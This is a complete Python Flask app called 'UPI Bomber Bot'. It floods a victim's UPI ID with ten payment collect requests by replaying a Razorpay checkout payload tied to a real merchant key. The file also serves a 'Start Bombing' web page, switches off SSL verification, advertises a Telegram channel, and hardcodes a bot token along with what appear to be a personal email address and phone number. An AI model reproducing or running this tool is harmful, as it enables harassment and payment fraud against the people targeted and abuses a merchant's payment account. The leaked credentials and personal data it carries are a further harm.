
import os
import logging
import requests
import json
import urllib.parse
import re
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# Configuration
TOKEN = "8671717333:AAH0qX8O6Bg-7NLv9HUWLvsVrMB_s8dJI28"
CHANNEL_USERNAME = "hemantscripts"

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- UPI BOMBING FUNCTION ----------
def perform_upi_bombing(vpa):
    """Perform UPI bombing"""
    success_count = 0
    failed_count = 0
    details = []
    
    try:
        session = requests.Session()
        session.verify = False
        
        # Get session token
        api2 = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=8bffa280de336408f6c3cdfe8bc6ec534d4bddcc&build_v1=0474dadf8b040ee8ffbb695d41d925e50d30fc46&checkout_v2=1&new_session=1&rzp_device_id=1.d7f92c5a00a24a1ef65a96576d2cceb815b2b151.1771871727657.22192428&unified_session_id=SK304mkDOgbYu2"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36"
        }
        
        response = session.get(api2, headers=headers, timeout=20)
        
        if response.status_code == 200:
            details.append("✅ Session obtained")
        else:
            details.append("⚠️ Fallback session")
        
        # Send 10 payment requests
        for i in range(10):
            try:
                api3 = "https://api.razorpay.com/v1/payments/create/checkout?key_id=rzp_live_URBkdnF2makVoq"
                
                order_id = f"order_T5OXX3mtFlNT{i}"
                amount = 100 * (i + 1)
                
                data3 = f'description=Fabindia+Limited&currency=INR&order_id={order_id}&amount={amount}&email=chuudrihemant%40gmail.com&contact=9028382597&method=upi&save=0&customer_id=cust_T5OLk64iW8Q3d9&upi%5Bvpa%5D={urllib.parse.quote(vpa)}&upi%5Bflow%5D=collect&callback_url=https%3A%2F%2Fapi.cq6bn590y3-fabindiao1-p1-public.model-t.cc.commerce.ondemand.com%2Focc%2Fv2%2Ffabindiab2c%2Fpayment%2Frazorpay%2Fcarts%2F27508842%2Fpayment%2Fcallback%2Fchuudrihemant%40gmail.com%2F1782288011072-f75cfbc0-a33d-4e81-84a1-ed015c656caa%2FINR&key_id=rzp_live_URBkdnF2makVoq&_%5Bshield%5D%5Bfhash%5D=1cbfb0d49db2cc5005ffc2e5e8423a2cd5958a45&_%5Bdevice_id%5D=1.1cbfb0d49db2cc5005ffc2e5e8423a2cd5958a45.1782287987833.60570495&_%5Bshield%5D%5Btz%5D=330&_%5Bbuild%5D=28022124953&_%5Bcheckout_id%5D=T5OWkM8yC8GijP'
                
                headers3 = {
                    "Host": "api.razorpay.com",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://api.razorpay.com",
                    "Referer": "https://api.razorpay.com/v1/checkout/public",
                    "Accept": "*/*"
                }
                
                payment_response = session.post(api3, data=data3, headers=headers3, timeout=20)
                
                if payment_response.status_code in [200, 201, 202]:
                    success_count += 1
                    details.append(f"✅ Req {i+1}: Success")
                else:
                    failed_count += 1
                    details.append(f"❌ Req {i+1}: Failed ({payment_response.status_code})")
                
                time.sleep(0.3)
                
            except Exception as e:
                failed_count += 1
                details.append(f"❌ Req {i+1}: Error")
        
        return success_count, failed_count, "\n".join(details)
        
    except Exception as e:
        return 0, 1, f"❌ Error: {str(e)}"

# ---------- FLASK ROUTES ----------
@app.route('/')
def index():
    """Main page with embedded HTML"""
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>UPI Bomber Bot</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }}
            .container {{
                background: rgba(255,255,255,0.95);
                border-radius: 25px;
                padding: 40px;
                max-width: 480px;
                width: 100%;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }}
            .logo {{ text-align: center; margin-bottom: 25px; }}
            .logo-icon {{ font-size: 50px; }}
            .logo h1 {{
                font-size: 28px;
                color: #333;
                margin-top: 8px;
            }}
            .logo h1 span {{
                background: linear-gradient(135deg, #667eea, #764ba2);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }}
            .channel-badge {{
                background: linear-gradient(135deg, #667eea, #764ba2);
                color: white;
                padding: 6px 18px;
                border-radius: 20px;
                display: inline-block;
                font-size: 13px;
                font-weight: 600;
                margin: 8px 0;
            }}
            .input-group {{
                margin-bottom: 18px;
            }}
            .input-group input {{
                width: 100%;
                padding: 14px 18px;
                border: 2px solid #e0e0e0;
                border-radius: 12px;
                font-size: 16px;
                transition: all 0.3s;
                background: #f8f9fa;
            }}
            .input-group input:focus {{
                outline: none;
                border-color: #667eea;
                box-shadow: 0 0 0 4px rgba(102,126,234,0.15);
                background: white;
            }}
            .btn-bomb {{
                width: 100%;
                padding: 15px;
                background: linear-gradient(135deg, #667eea, #764ba2);
                color: white;
                border: none;
                border-radius: 12px;
                font-size: 18px;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.3s;
            }}
            .btn-bomb:hover:not(:disabled) {{
                transform: translateY(-2px);
                box-shadow: 0 10px 30px rgba(102,126,234,0.4);
            }}
            .btn-bomb:disabled {{
                opacity: 0.6;
                cursor: not-allowed;
            }}
            .result-box {{
                margin-top: 20px;
                padding: 18px;
                border-radius: 12px;
                display: none;
            }}
            .result-box.show {{ display: block; }}
            .result-box.success {{
                background: #d4edda;
                border: 2px solid #c3e6cb;
                color: #155724;
            }}
            .result-box.error {{
                background: #f8d7da;
                border: 2px solid #f5c6cb;
                color: #721c24;
            }}
            .stats {{
                display: flex;
                justify-content: space-around;
                margin: 12px 0;
                padding: 12px;
                background: rgba(255,255,255,0.5);
                border-radius: 10px;
            }}
            .stat-item {{ text-align: center; }}
            .stat-item .number {{
                font-size: 28px;
                font-weight: 800;
            }}
            .success-color {{ color: #28a745; }}
            .failed-color {{ color: #dc3545; }}
            .total-color {{ color: #667eea; }}
            .details {{
                max-height: 150px;
                overflow-y: auto;
                font-size: 12px;
                background: rgba(255,255,255,0.5);
                padding: 10px;
                border-radius: 8px;
                margin-top: 10px;
                font-family: monospace;
                line-height: 1.6;
            }}
            .channel-section {{
                text-align: center;
                padding: 14px;
                background: #f0f2ff;
                border-radius: 12px;
                margin-top: 18px;
                border: 2px dashed #667eea;
            }}
            .channel-section a {{
                color: #667eea;
                text-decoration: none;
                font-weight: 700;
                font-size: 15px;
            }}
            .channel-section a:hover {{ text-decoration: underline; }}
            .footer {{
                text-align: center;
                margin-top: 15px;
                font-size: 12px;
                color: #999;
            }}
            .footer a {{ color: #667eea; text-decoration: none; }}
            .loading-spinner {{
                display: inline-block;
                animation: spin 1s linear infinite;
            }}
            @keyframes spin {{
                from {{ transform: rotate(0deg); }}
                to {{ transform: rotate(360deg); }}
            }}
            .status-badge {{
                display: inline-block;
                padding: 3px 12px;
                border-radius: 20px;
                font-size: 11px;
                font-weight: 700;
                margin-top: 6px;
                background: #d4edda;
                color: #155724;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <div class="logo-icon">⚡</div>
                <h1>UPI <span>Bomber</span></h1>
                <div class="channel-badge"><i class="fas fa-telegram"></i> @{CHANNEL_USERNAME}</div>
                <p style="color: #888; font-size: 14px;">💳 Send 10 payment requests instantly</p>
            </div>
            
            <div class="input-group">
                <input type="text" id="upi-input" placeholder="example@upi" autocomplete="off">
            </div>
            
            <button class="btn-bomb" id="bomb-btn">
                <i class="fas fa-rocket"></i>
                <span id="btn-text"> Start Bombing</span>
            </button>
            
            <div id="result" class="result-box">
                <div id="result-content"></div>
            </div>
            
            <div class="channel-section">
                <i class="fas fa-telegram"></i>
                <a href="https://t.me/{CHANNEL_USERNAME}" target="_blank">Join @{CHANNEL_USERNAME}</a>
                <br>
                <span class="status-badge"><i class="fas fa-circle" style="color: #28a745; font-size: 8px;"></i> Bot is Admin</span>
            </div>
            
            <div class="footer">
                Made with ❤️ | <a href="https://t.me/{CHANNEL_USERNAME}" target="_blank">@{CHANNEL_USERNAME}</a>
            </div>
        </div>
        
        <script>
            document.getElementById('bomb-btn').addEventListener('click', async function() {{
                const input = document.getElementById('upi-input');
                const vpa = input.value.trim();
                const btn = this;
                const resultBox = document.getElementById('result');
                const resultContent = document.getElementById('result-content');
                
                if (!vpa || !vpa.includes('@')) {{
                    resultBox.className = 'result-box show error';
                    resultContent.innerHTML = '<i class="fas fa-exclamation-circle"></i> Invalid UPI ID! Please enter valid UPI like example@upi';
                    input.focus();
                    return;
                }}
                
                btn.disabled = true;
                document.getElementById('btn-text').innerHTML = ' <span class="loading-spinner"><i class="fas fa-spinner"></i></span> Sending...';
                resultBox.className = '';
                
                try {{
                    const response = await fetch('/api/bomb', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ vpa: vpa }})
                    }});
                    
                    const data = await response.json();
                    
                    if (data.success) {{
                        resultBox.className = 'result-box show success';
                        resultContent.innerHTML = `
                            <div style="text-align: center; margin-bottom: 10px;">
                                <i class="fas fa-check-circle" style="font-size: 35px; color: #28a745;"></i>
                                <h3 style="margin-top: 5px;">Bombing Complete!</h3>
                                <p style="font-size: 14px;"><strong>UPI:</strong> ${{data.vpa}}</p>
                            </div>
                            <div class="stats">
                                <div class="stat-item">
                                    <div class="number success-color">${{data.success_count}}</div>
                                    <div style="font-size: 12px;">✅ Success</div>
                                </div>
                                <div class="stat-item">
                                    <div class="number failed-color">${{data.failed_count}}</div>
                                    <div style="font-size: 12px;">❌ Failed</div>
                                </div>
                                <div class="stat-item">
                                    <div class="number total-color">${{data.total}}</div>
                                    <div style="font-size: 12px;">📊 Total</div>
                                </div>
                            </div>
                            <div class="details">${{data.details.join('<br>')}}</div>
                        `;
                    }} else {{
                        resultBox.className = 'result-box show error';
                        resultContent.innerHTML = `<i class="fas fa-times-circle"></i> ${{data.message || 'Error!'}}`;
                    }}
                }} catch (error) {{
                    resultBox.className = 'result-box show error';
                    resultContent.innerHTML = '<i class="fas fa-wifi"></i> Network Error! Please try again.';
                }} finally {{
                    btn.disabled = false;
                    document.getElementById('btn-text').innerHTML = ' <i class="fas fa-rocket"></i> Start Bombing';
                }}
            }});
            
            document.getElementById('upi-input').addEventListener('keypress', function(e) {{
                if (e.key === 'Enter') document.getElementById('bomb-btn').click();
            }});
            
            document.getElementById('upi-input').focus();
        </script>
    </body>
    </html>
    '''

@app.route('/api/bomb', methods=['POST'])
def bomb_api():
    """API endpoint for bombing"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'message': 'No data provided'}), 400
        
        vpa = data.get('vpa', '').strip()
        
        if not vpa or '@' not in vpa:
            return jsonify({
                'success': False,
                'message': 'Invalid UPI ID. Please enter valid UPI like example@upi'
            }), 400
        
        success_count, failed_count, details = perform_upi_bombing(vpa)
        
        return jsonify({
            'success': True,
            'vpa': vpa,
            'success_count': success_count,
            'failed_count': failed_count,
            'total': success_count + failed_count,
            'details': details.split('\n')
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error: {str(e)}'
        }), 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'ok',
        'message': 'UPI Bomber Bot is running!',
        'channel': CHANNEL_USERNAME
    })

# ---------- MAIN ----------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("🚀 UPI Bomber Bot Starting...")
    print(f"🌐 http://localhost:{port}")
    print(f"👑 Channel: @{CHANNEL_USERNAME}")
    print("-" * 40)
    app.run(host='0.0.0.0', port=port, debug=False)
